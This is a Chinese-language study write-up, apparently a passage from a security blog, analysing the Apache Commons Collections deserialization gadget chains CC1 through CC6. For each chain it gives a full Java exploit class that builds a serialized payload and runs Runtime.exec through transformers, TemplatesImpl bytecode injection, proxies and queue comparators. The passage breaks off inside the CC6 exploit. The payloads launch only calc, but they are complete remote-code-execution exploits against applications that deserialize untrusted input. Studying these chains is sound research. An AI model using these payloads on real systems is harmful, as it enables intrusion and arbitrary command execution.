反序列化时执行transform方法即可rce.下面就是找可用类链子了。因为不可能直接就在readObject里调用transform吧。 下面是cc1中链子的开始。org.apache.commons.collections.map.LazyMap 它实现了Serializable接口并存在readObject方法。 LazyMap的get方法 123456789public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; else &#123; return super.map.get(key); &#125;&#125; this.factory.transform(key)就是一个调用了transform的例子。那么只要factory可控就能调用上面的反射rce了。 看下构造方法。虽然只要实例化的话就能控制factory了。但是这不是一个public的构造方法，在java中想要获取到这个构造方法还是得用反射。此时的exp已经可以写成 123456789101112131415161718public static void main(String[] args) throws Exception &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); HashMap innermap = new HashMap(); Constructor constructor = Class.forName(\"org.apache.commons.collections.map.LazyMap\").getDeclaredConstructor(Map.class, Transformer.class); constructor.setAccessible(true); LazyMap map = (LazyMap)constructor.newInstance(innermap,chain); map.get(123); &#125; 所以，最后也是最难的一点就是找到一个调用get并传递任意值的地方，来调用我们lazymap的get方法。这也就是作者的强大之处。 jdk1.7版本下找到的是sun.reflect.annotation.AnnotationInvocationHandler注意你直接导入是导不了这个类的。可以在jre的rt.jar 中找到这个\\sun\\reflect\\annotation\\AnnotationInvocationHandler.class 12345678910111213private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); ...... 注意这里readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler） 这也就是java 的动态代理机制。调用entryset这个方法实际上调用的是代理的invoke.invoke里又调用了memberValues的get.那么只要令memberValues为我们构造好的Lazymap对象即可 final exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.bag.HashBag;import org.apache.commons.collections.functors.*;import org.apache.commons.collections.map.LazyMap;import sun.reflect.annotation.AnnotationParser;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.IdentityHashMap;import java.util.Map;public class cc1 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Constructor constructor = Class.forName(\"org.apache.commons.collections.map.LazyMap\").getDeclaredConstructor(Map.class, Transformer.class); constructor.setAccessible(true); HashMap hashMap = new HashMap&lt;String, String&gt;(); Object lazyMap = constructor.newInstance(hashMap, chainedTransformer); constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap); Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), new Class[]&#123;Map.class&#125;, invo); constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Deprecated.class, proxy); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"out.bin\")); oos.writeObject(obj); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"out.bin\")); ois.readObject(); ois.close(); &#125;&#125; CommonCollections2 首先注意是CommonsCollections4的依赖 起点是java.util.PriorityQueue#readObject 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \"proper order\", but the // spec has never explained what that might be. heapify();&#125;private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);&#125;private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);&#125;private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x;&#125; 这里queue可控。然后一条链走向heapify =&gt; siftDown =&gt; siftDownUsingComparator =&gt; comparator.compare 这里就可以开启新的gadget了。比如cc2链子中使用的是org.apache.commons.collections4.comparators.TransformingComparator 的同名compare方法。 12345public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);&#125; transform方法的作用自然是之前的一套反射组合拳进行rce了。所以需要transformer可控。而从构造方法去看的话会发现也是可控的。 这里就可以写一个exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354package top.bycsec;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;public class cc2 &#123; public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123; ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] &#123; String.class, Class[].class &#125;, new Object[] &#123; \"getRuntime\", new Class[0] &#125;), new InvokerTransformer(\"invoke\", new Class[] &#123; Object.class, Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;), new InvokerTransformer(\"exec\", new Class[] &#123; String.class &#125;, new Object[]&#123;\"calc\"&#125;)&#125;); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 这里首先注意queue加了两个元素，这是因为size不大于1的话无法进入siftDown方法。然后queue.add这段代码不能放到反射实例化comparator的后面。因为代码段中如果comparator不为null会放不进去元素。 然后其实上面这个exp并不是ysoserial CC2的exp链子。它使用的是javassist + TemplatesImpl。首先简单说明下javassist,它提供了修改字节码的功能。 比如我们手动生成一个byc404.class 1234567891011121314151617181920212223242526package top.bycsec;import javassist.*;public class cc2 &#123; public static void createPseson() throws Exception &#123; ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"System.out.println(\\\"evil code\\\");\"; // 创建 static 代码块，并插入代码 cc.makeClassInitializer().insertBefore(cmd); String ClassName = \"byc404\"; cc.setName(ClassName); // 写入.class 文件 cc.writeFile(); &#125; public static void main(String[] args) &#123; try &#123; createPseson(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 像这样能够直接控制static方法的话,那么它在实例化时就会被直接执行。 接下来看看它真正的核心TemplatesImpl的使用 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException&#123; TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) &#123; transformer.setURIResolver(_uriResolver); &#125; if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123; transformer.setSecureProcessing(true); &#125; return transformer;&#125; 跟进getTransletInstance 12345678910private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); 这里defineTransletClasses()可以还原bytecode为class.后面的newInstance()则可以实例化这个class.在这个实例化的过程中static方法就会执行。所以达成了一个任意命令执行的效果。 再稍微多回顾下前面我们达到的进度，就是我们已经可以任意调用transform了,只需一个可控对象。那么这里再用之前经常用到的InvokerTransformer.transform反射来调用TemplatesImpl.newtransformer 最终exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package top.bycsec;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.util.PriorityQueue;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.*;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;public class cc2 &#123; public static void main(String[] args) throws Exception &#123; Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"byc404\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc2\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc2\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; 这个exp几个细节还是值得说明一下的。不过我还是偷懒下不深入了，就当做一些注意事项简单说明下。 1.为了进入defineTransletClasses需要把恶意类的父类设置为AbstractTranslet。否则_transletIndex会小于0爆出错误。2.通过反射的方式来设置queue的值，而是直接add。这里我们queue的第一个元素是templates即TemplatesImpl.class.newInstance();。这是一个类。而第二个元素是1.这两个元素在add时会出现比较出错。所以得保证类型一致。不过还有一个方法就是里面放两个一样的元素即都为template. CommonsCollections3 CC3又回到了CommonsCollections3.1的依赖。有点像CC1+CC2。用到了两个链子的关键内容。 区别在于用了TrAXFilter调用newTransformer() 12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException &#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism(); &#125; 然后不同于以外的InvokeTransformer,它改用了InstantiateTransformer.其transform方法如下 12345678public Object transform(Object input) &#123; try &#123; if (!(input instanceof Class)) &#123; throw new FunctorException(\"InstantiateTransformer: Input object was not an instanceof Class, it was a \" + (input == null ? \"null object\" : input.getClass().getName())); &#125; else &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; 这里创建了类实例，如果把input设置为TrAXFilter,那么就会在这里实例化的时候调用其构造方法，触发TemplatesImpl#newTransformer。 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package top.bycsec;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class cc3 &#123; public static void main(String[] args) throws Exception &#123; ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"byc404\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;) &#125;); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Deprecated.class,map); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]&#123;Map.class&#125;,map_handler); Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Deprecated.class,proxy_map); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3\")); outputStream.writeObject(handler); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; CommonsCollections4 依赖环境变为Commons Collections 4.0 似乎就是个杂交……因为依赖变为4.0了。直接使用CC2 中的queue+ CC3中的transform调用。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104package top.bycsec;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;import javassist.ClassClassPath;import javassist.ClassPool;import javassist.CtClass;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InstantiateTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.InvokerTransformer;import javax.xml.transform.Templates;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.PriorityQueue;public class cc4 &#123; public static void main(String[] args) throws Exception&#123; Constructor constructor = Class.forName(\"org.apache.commons.collections4.functors.InvokerTransformer\").getDeclaredConstructor(String.class); constructor.setAccessible(true); InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(\"newTransformer\"); TransformingComparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(1); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"byc\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"byc404\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]&#123;classBytes&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;) &#125;); Object[] queue_array = new Object[]&#123;templates,1&#125;; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); Field size = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"size\"); size.setAccessible(true); size.set(queue,2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try&#123; ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\")); inputStream.readObject(); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception &#123; final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); &#125; public static Field getField(final Class&lt;?&gt; clazz, final String fieldName) &#123; Field field = null; try &#123; field = clazz.getDeclaredField(fieldName); field.setAccessible(true); &#125; catch (NoSuchFieldException ex) &#123; if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); &#125; return field; &#125;&#125; CommonsCollections5 cc5跟过一次。当时没用jdk1.7的环境。现在实验下jdk1.7 + cc3依赖的exp.另外发现这个链子cc3,cc4依赖都可以使用。貌似是ysoserial只写了cc3的链子。稍微改下就可以用在cc4的环境了。 首先重点还是构造链子来调用喜闻乐见的反射transform rce payload.这里的方法在第一篇学反序列化时已经跟过了 然后是一个细节： TransformedMap.decorate()方法能将普通的MapA转换为TransformedMapB，同时如果TransformedMap.decorate()方法设置了第二个参数keyTransformer或者第三个参数valueTransformer，当TransformedMapB调用Map的put方法或者Map.Entry的setValue方法就会自动触发刚才设置的keyTransformer或者valueTransformer相应的Transformer 之所以提到decorate()是因为我自己这一部分cc1的链子在书写exp中用的是反射实例化的lazymap。当时只是跟着别人的exp用反射实例化了，结果后来发现明明cc3依赖中直接decorate就可以创建lazymap。这个方法在cc4依赖中变为了LazpMap方法 然后核心还是跟cc1一样,此时只要一个调用LazyMap#get的位置来触发rce。 用到的gadget是TiedMapEntry#toString =&gt; getValue =&gt; get.需要this.map为LazyMap.跟过一遍就不再说了。 再接下来是BadAttributeValueExpException来触发toString.因为其readObject中valobj.toString的valobj来自输入的val。所以直接反射设置为TiedMapEntry即可 1234private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); ...... exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap hashMap = new HashMap&lt;String, String&gt;(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"placeholder\"); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(\"placeholder\"); Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(badAttributeValueExpException); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 然后上面说了。换成cc4依赖是通杀的。我们只需将exp中依赖全部换成4的，然后decorate方法换成lazyMap来实例化LazyMap即可 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package top.bycsec;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.keyvalue.TiedMapEntry;import org.apache.commons.collections4.map.LazyMap;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc5 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap hashMap = new HashMap&lt;String, String&gt;(); Map lazyMap = LazyMap.lazyMap(hashMap,chainedTransformer); //Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"placeholder\"); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(\"placeholder\"); Field field = badAttributeValueExpException.getClass().getDeclaredField(\"val\"); field.setAccessible(true); field.set(badAttributeValueExpException, tiedMapEntry); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(badAttributeValueExpException); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); inputStream.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; CommonsCollections6 比较类似CC5的链子。然后利用环境也是3,4通杀。 cc6的gadget与cc5的区别在于没有利用TiedMapEntry#toString,而是TiedMapEntry#hashCode 这个方法在URLDNS中出现过,在反序列化时会重新计算对象的 hashCode. 12345678public int hashCode() &#123; Object value = this.getValue(); return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());&#125;public Object getValue() &#123; return this.map.get(this.key);&#125; 跟toString一样调用了getValue。所以就基本一样了。 触发hashcode的方法是利用Hashmap类的hash 1234567891011121314final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); // This function ensures that hashCodes that differ only by // constant multiples at each bit position have a bounded // number of collisions (approximately 8 at default load factor). h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12); return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125; 加上hashMap.put 1234567891011121314151617public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; 这样就可以直接put触发了。然后官方的链子不知道为啥加上了一个Hashset,有点奇怪。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package top.bycsec;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.util.HashMap;import java.util.Map;public class cc6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[]&#123;&#125;&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;\"calc\"&#125;&#125;), &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"placeholder\"); HashMap hashMap = new HashMap(); hashMap.put(tiedMapEntry, \"byc\"); Field field = chainedTransformer.getClass().getDeclaredField(\"iTransformers\"); field.setAccessible(true); field.set(chainedTransformer, transformers); innerMap.clear(); try &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); oos.writeObject(hashMap); oos.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./out.bin\")); 